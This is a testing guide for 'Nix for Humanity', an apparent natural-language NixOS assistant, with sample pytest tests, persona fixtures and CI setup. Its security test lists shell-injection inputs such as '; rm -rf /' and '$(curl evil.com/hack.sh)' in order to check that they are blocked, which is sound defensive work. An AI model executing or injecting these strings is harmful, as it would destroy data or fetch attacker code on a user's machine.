# 🧪 Testing Guide - Nix for Humanity

*Comprehensive guide to testing the symbiotic AI system*

---

💡 **Quick Context**: Complete testing strategy for reliable, accessible, and trustworthy symbiotic AI  
📍 **You are here**: Development → Testing Guide (Quality Assurance Framework)  
🔗 **Related**: [Code Standards](./04-CODE-STANDARDS.md) | [Quick Start](./03-QUICK-START.md) | [Master Documentation Map](../MASTER_DOCUMENTATION_MAP.md)  
⏱️ **Read time**: 12 minutes  
📊 **Mastery Level**: 🌿 Intermediate - requires testing experience and understanding of AI systems

🌊 **Natural Next Steps**:
- **For new developers**: Start with [Quick Start Guide](./03-QUICK-START.md) to setup your environment first
- **For implementers**: Review [Code Standards](./04-CODE-STANDARDS.md) for testing patterns and requirements  
- **For QA engineers**: Continue to [System Architecture](../02-ARCHITECTURE/01-SYSTEM-ARCHITECTURE.md) to understand what you're testing
- **For contributors**: Check [Sacred Trinity Workflow](./02-SACRED-TRINITY-WORKFLOW.md) for development process integration

---

## Overview

Nix for Humanity follows a rigorous testing strategy to ensure reliability, accessibility, and user trust. We aim for **95% test coverage** across all critical paths.

**Current Status**: 📊 62% coverage → Target: 95%

*Sacred Humility Context: Our testing strategy represents our current understanding of quality assurance for consciousness-first AI systems. While our approaches draw from established software testing methodologies, testing the unique challenges of symbiotic human-AI interactions requires ongoing validation and evolution as we learn from real-world usage patterns. Our test coverage goals and methodologies reflect our specific development context and may need adaptation for different project scales, team structures, and user communities. We acknowledge that our 95% coverage target is aspirational and may require adjustment based on real-world validation of our testing approaches.*

## Quick Start

### Running All Tests
```bash
# Enter development environment
./dev.sh

# Run all tests with coverage
./dev.sh test-cov

# Run tests without coverage (faster)
./dev.sh test

# Run specific test file
python -m pytest tests/test_nlp_engine.py -v
```

### Checking Coverage
```bash
# Generate coverage report
./dev.sh test-cov

# View HTML coverage report
open htmlcov/index.html

# Quick coverage summary
coverage report
```

## Test Structure

```
tests/
├── unit/                    # Fast, isolated tests
│   ├── test_nlp_engine.py  # NLP component tests
│   ├── test_command_executor.py
│   ├── test_knowledge_base.py
│   └── test_learning_system.py
│
├── integration/             # Component interaction tests
│   ├── test_cli_integration.py
│   ├── test_backend_integration.py
│   └── test_api_integration.py
│
├── e2e/                     # End-to-end user journeys
│   ├── test_persona_journeys.py
│   ├── test_voice_interface.py
│   └── test_learning_evolution.py
│
├── fixtures/                # Test data and mocks
│   ├── sample_commands.json
│   ├── nixos_responses.json
│   └── persona_profiles.py
│
└── conftest.py             # Shared test configuration
```

## Testing Pyramid

Following our code standards, we maintain:

- **60% Unit Tests** - Fast, focused, numerous
- **30% Integration Tests** - Component interactions
- **10% E2E Tests** - Complete user journeys

## Writing Tests

### Unit Test Example
```python
# tests/unit/test_nlp_engine.py
import pytest
from luminous_nix.nlp import NLPEngine

class TestNLPEngine:
    """Test natural language understanding components."""
    
    def test_intent_recognition_install(self):
        """Test recognizing install intent from various phrases."""
        nlp = NLPEngine()
        
        test_phrases = [
            "install firefox",
            "I need firefox",
            "get me that firefox thing",
            "can you install firefox for me?"
        ]
        
        for phrase in test_phrases:
            result = nlp.parse(phrase)
            assert result.intent == "install"
            assert result.package == "firefox"
    
    def test_typo_correction(self):
        """Test automatic typo correction."""
        nlp = NLPEngine()
        
        result = nlp.parse("instal fierfix")
        assert result.intent == "install"
        assert result.package == "firefox"
        assert result.corrections == ["instal->install", "fierfix->firefox"]
```

### Integration Test Example
```python
# tests/integration/test_cli_integration.py
import pytest
from luminous_nix.cli import CLI
from luminous_nix.backend import Backend

class TestCLIIntegration:
    """Test CLI interaction with backend services."""
    
    @pytest.fixture
    def cli_with_backend(self):
        """Create CLI connected to test backend."""
        backend = Backend(test_mode=True)
        cli = CLI(backend=backend)
        return cli
    
    def test_install_flow(self, cli_with_backend):
        """Test complete installation flow."""
        # User input
        response = cli_with_backend.process("install firefox")
        
        # Check response
        assert response.success
        assert "firefox" in response.message
        assert response.command == "nix-env -iA nixos.firefox"
        
        # Verify backend state
        assert cli_with_backend.backend.last_intent == "install"
```

### E2E Test Example
```python
# tests/e2e/test_persona_journeys.py
import pytest
from luminous_nix.test_utils import PersonaSimulator

class TestPersonaJourneys:
    """Test complete user journeys for each persona."""
    
    @pytest.mark.parametrize("persona", [
        "grandma_rose",
        "maya_adhd",
        "dr_sarah",
        "alex_blind"
    ])
    def test_first_time_install(self, persona):
        """Test first software installation for each persona."""
        simulator = PersonaSimulator(persona)
        
        # Simulate natural interaction
        session = simulator.start_session()
        
        # Persona-specific input
        if persona == "grandma_rose":
            response = session.speak("I need that Firefox thing my grandson mentioned")
        elif persona == "maya_adhd":
            response = session.type("firefox now")
        elif persona == "dr_sarah":
            response = session.type("install firefox-esr for research")
        elif persona == "alex_blind":
            response = session.screen_reader_input("install firefox")
        
        # Verify success for persona
        assert response.accessible
        assert response.time_ms < simulator.persona.max_response_time
        assert session.task_completed("install_firefox")
```

## Coverage Requirements

### Minimum Coverage by Component
- **Critical Paths**: 95%
  - NLP intent recognition
  - Command execution
  - Safety validation
  - Error handling
  
- **Core Features**: 90%
  - Learning system
  - Context management
  - Personality adaptation
  
- **UI/UX**: 80%
  - CLI interactions
  - TUI components
  - Response formatting

### What Must Be Tested
1. **All 10 Personas** succeed at core tasks
2. **Security boundaries** are enforced
3. **Performance budgets** are met
4. **Accessibility standards** are maintained
5. **Privacy guarantees** are upheld

## Test Data Management

### Fixtures
```python
# tests/fixtures/persona_profiles.py
PERSONAS = {
    "grandma_rose": {
        "age": 75,
        "tech_level": "beginner",
        "preferred_style": "friendly",
        "max_response_time": 2000,
        "typical_commands": [
            "I need that Firefox thing",
            "How do I update?",
            "My computer is slow"
        ]
    },
    "maya_adhd": {
        "age": 16,
        "tech_level": "intermediate",
        "preferred_style": "minimal",
        "max_response_time": 1000,
        "typical_commands": [
            "firefox",
            "update now",
            "install discord"
        ]
    }
    # ... other personas
}
```

### Mock Data
```python
# tests/fixtures/mock_nixos.py
class MockNixOS:
    """Mock NixOS system for testing."""
    
    def __init__(self):
        self.installed_packages = set()
        self.available_packages = {
            "firefox": {"version": "120.0", "size": "75MB"},
            "chromium": {"version": "119.0", "size": "85MB"},
            # ... more packages
        }
    
    def install(self, package):
        """Simulate package installation."""
        if package in self.available_packages:
            self.installed_packages.add(package)
            return True
        return False
```

## Continuous Integration

### Pre-commit Hooks
```bash
# .pre-commit-config.yaml
repos:
  - repo: local
    hooks:
      - id: tests
        name: tests
        entry: python -m pytest tests/unit -x
        language: system
        pass_filenames: false
        always_run: true
```

### CI Pipeline
```yaml
# .github/workflows/test.yml
name: Tests
on: [push, pull_request]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Set up Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.11'
      - name: Install dependencies
        run: |
          pip install -r requirements.txt
          pip install -r requirements-dev.txt
      - name: Run tests with coverage
        run: |
          pytest --cov=luminous_nix --cov-report=xml
      - name: Upload coverage
        uses: codecov/codecov-action@v3
```

## Performance Testing

### Response Time Tests
```python
# tests/performance/test_response_times.py
import time
import pytest

class TestPerformance:
    """Ensure performance budgets are met."""
    
    @pytest.mark.performance
    def test_simple_command_speed(self, nlp_engine):
        """Simple commands must respond in <2 seconds."""
        start = time.time()
        
        result = nlp_engine.process("install firefox")
        
        duration = time.time() - start
        assert duration < 2.0, f"Took {duration}s, max allowed is 2s"
    
    @pytest.mark.performance
    def test_maya_speed_requirement(self, nlp_engine):
        """Maya (ADHD) requires <1 second responses."""
        start = time.time()
        
        result = nlp_engine.process("firefox", persona="maya")
        
        duration = time.time() - start
        assert duration < 1.0, f"Maya needs <1s, took {duration}s"
```

## Security Testing

### Boundary Testing
```python
# tests/security/test_boundaries.py
class TestSecurityBoundaries:
    """Test security boundaries are maintained."""
    
    def test_no_shell_injection(self, command_executor):
        """Prevent shell injection attacks."""
        malicious_inputs = [
            "install firefox; rm -rf /",
            "install `echo pwned`",
            "install $(curl evil.com/hack.sh)"
        ]
        
        for evil_input in malicious_inputs:
            result = command_executor.process(evil_input)
            assert result.blocked
            assert "security" in result.reason.lower()
    
    def test_privacy_preserved(self, learning_system):
        """Ensure no private data is leaked."""
        # Add private data
        learning_system.learn("install firefox", "/home/user/secret.txt")
        
        # Export learned data
        exported = learning_system.export()
        
        # Verify sanitization
        assert "/home/user" not in str(exported)
        assert "secret.txt" not in str(exported)
```

## Debugging Failed Tests

### Verbose Output
```bash
# Run with detailed output
pytest -vv tests/test_nlp_engine.py::test_intent_recognition_install

# Show print statements
pytest -s tests/test_nlp_engine.py

# Drop into debugger on failure
pytest --pdb tests/test_nlp_engine.py
```

### Common Issues

1. **Flake timeouts**: Use `NIX_FOR_HUMANITY_OFFLINE=true` for offline tests
2. **Import errors**: Ensure `PYTHONPATH` includes project root
3. **Coverage gaps**: Check `htmlcov/index.html` for uncovered lines

## Best Practices

1. **Test behavior, not implementation** at boundaries
2. **Test implementation** for algorithms and critical logic
3. **Use personas** to validate accessibility
4. **Mock external dependencies** (NixOS, network)
5. **Keep tests fast** - parallelize when possible
6. **Document why** not just what you're testing

## Next Steps

To improve our coverage from 62% to 95%:

1. **Immediate** (This Week):
   - Add unit tests for `cli_adapter.py` (0% → 95%)
   - Complete `nlp_engine.py` tests (45% → 95%)
   - Test `command_executor.py` (30% → 95%)

2. **Short-term** (Next Week):
   - Add integration tests for CLI ↔ Backend
   - Create E2E tests for all 10 personas
   - Add performance test suite

3. **Long-term** (This Month):
   - Continuous fuzzing for security
   - Mutation testing for test quality
   - Visual regression tests for TUI

---

*Remember: Every test is a promise to users that the system works as expected. Test with love! 🌊*